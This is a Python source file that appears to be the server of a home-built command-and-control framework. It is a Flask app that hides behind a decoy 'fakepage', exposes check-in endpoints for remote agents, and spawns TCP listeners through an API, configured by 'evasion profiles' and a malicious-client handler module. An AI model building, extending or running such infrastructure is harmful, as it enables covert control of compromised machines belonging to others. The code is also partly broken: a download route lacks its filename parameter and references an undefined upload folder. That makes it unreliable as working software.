#!/bin/python3
try:
    import subprocess as sp
    import socket
    import threading
    #import time
    import os
    #import sys
    import random
    import atexit
    from datetime import datetime, timezone
    import logging
    import argparse
    import threading
    import traceback
    import ssl
    import inspect
    import asyncio
    import signal
    import sys
    import time
    from flask import Flask, jsonify, request, send_from_directory


    # My Modules
    import tcp_listener
    import DataEngine.JsonHandler as json_parser
    import DataEngine.JsonHandler
    import DataEngine.DataDBHandler
    #from DataEngine.RSAEncryptionHandler import Encryptor ##  Not needed, switching to SSL
    import ClientEngine.ClientHandler
    import ClientEngine.MaliciousClientHandler
    import SecurityEngine.AuthenticationHandler
    import Comms.CommsHandler
    import Utils.UtilsHandler
    import Utils.KeyGen
    import ApiEngine.ConfigHandler
    ## Error modules
    import ApiEngine.ErrorDefinitions
    import Utils.ErrorDefinitions

except Exception as e:
    print(f"[server.py] Import Error: {e}")
    exit()

"""
Argparse settings first in order to be able to change anything
"""
parser = argparse.ArgumentParser()
parser.add_argument('--ip', help="The IP to listen on (0.0.0.0 is a good default", required=True)
parser.add_argument('--port', help="The port to listen on", required=True)
parser.add_argument('--quiet', help="No output to console", action='store_true')
parser.add_argument('--fileserverport', help="what port for the file server", default=80)
parser.add_argument('-c', '--generatekeys', help="ReGen Certs & Keys", action="store_true")
parser.add_argument('--evasionprofile', help="The evasion profile", default="/EvasionProfiles/default.yaml")
parser.add_argument('--apiconfigprofile', help="The API config profile", default="Config/ApiSchemas/default.yaml")

## Globals bad. I know
args                = parser.parse_args()
ip                  = args.ip
port                = int(args.port)
quiet               = args.quiet
fileserverport      = args.fileserverport
generate_keys       = args.generatekeys
evasion_profile     = args.evasionprofile
api_config_profile  = args.apiconfigprofile
sys_path = os.path.dirname(os.path.realpath(__file__))
function_debug_symbol = "[^]"

"""
Here's the global Debug + Logging settings. 
Global Debug print to screen will be a setting in the future
"""
if not quiet:
    global_debug = True
else:
    global_debug = False
    
##Reference: https://realpython.com/python-logging/
logging.basicConfig(level=logging.DEBUG)
## Change the path to the system path + a log folder/file somewhere
logging.basicConfig(filename='server.log', filemode='a', format='%(asctime)s - %(levelname)s - %(message)s', force=True, datefmt='%Y-%m-%d %H:%M:%S')
if global_debug:
    logging.getLogger().addHandler(logging.StreamHandler())



class ListenerController:
    '''
    A class that takes care of the listeners, spawns them, etc.
    '''

    @staticmethod
    def spawn_listener(ip="127.0.0.1",port=80):
        '''
        Spawns a listener class. 

        ip (str): The IP to listen on.
            0.0.0.0 for any interface
            127.0.0.1 for localhost

        port (int): The port to listen on
        '''
        try:
            new_listener = tcp_listener.ServerSockHandler(
                ip = ip,
                port = port,
                evasion_profile = evasion_profile,
                function_debug_symbol="[^TCP_LIST]"
            )
            new_listener_thread = threading.Thread(target=new_listener.start_server)
            #new_listener_thread.daemon = True
            new_listener_thread.start()
        
        except Exception as e:
            logging.debug(f"{function_debug_symbol} {inspect.stack()[0][3]}")
            logging.warning(f"(temp) Error: {e}")

## Move to own file eventually
class ControlServer:
    app = Flask(__name__)
    config_file_path = Utils.UtilsHandler.load_file(current_path=sys_path, file_path=api_config_profile)
    UrlSc = ApiEngine.ConfigHandler.UrlSchema(api_config_profile=config_file_path)
    UrlSc.load()

    #def startup_config():
       #UrlSc = UrlSchema

    @app.route("/", methods=["GET"])
    def no_subdir():
        with open("ApiEngine/html/fakepage-MLP.txt") as fp:
            page = fp.read()
        return page
    
    @app.route(f"/{UrlSc.HOME_BASE}", methods=["GET"])
    def home():
        with open("ApiEngine/html/fakepage-MLP.txt") as fp:
            page = fp.read()
        return page
    
    ## for agents checking in
    @app.route(f"/{UrlSc.AGENT_BASE_ENDPOINT}", methods=["GET"])
    def agent_base():
        #return "<html><b>hi - get fucked</b></html>"
        return "agent_base"
    
    # commands to control the server
    @app.route(f"/{UrlSc.SERVER_BASE_ENDPOINT}", methods=["GET"])
    def server_base():
        #return "<html><b>hi - get fucked</b></html>"
        return "server_base"
    
    ## Listener Section
    @app.route(f"/{UrlSc.SPAWN_TCP_LISTENER_ENDPOINT}", methods=["POST"])
    def add_todo():
        try:
            # Extract JSON data from the request body
            data = request.json

            ## validate JSON

            ListenerController.spawn_listener(ip = data["ip"], port = data["port"])

            return jsonify({"message": "success"})
        except Exception as e:
            return jsonify({"error": str(e)}), 400
        
    ## File Section
    @app.route(f"/{UrlSc.UPLOAD_BASE_ENDPOINT}/", methods=["GET"])
    
    def download_file(filename):
        try:
            return send_from_directory(UPLOAD_FOLDER, filename)
        except Exception as e:
            with open("assets/html/errorcodes/400err.txt") as fp:
                page = fp.read()
            return page





if __name__ == "__main__":
    ControlServer.app.run(debug=True)
    #while True:
        #ListenerController.spawn_listener()
        #time.sleep(100)


'''
Daemon notes. It runs threads in the background, as long as the program is still executing, i.e. in a loop of some sorts.


Some things to think about.
    - Should the client connect here? This would give it control over each listener, vs controlling one at a time
    - Should I jsut bite the bullet and switch to an API based control scheme?
'''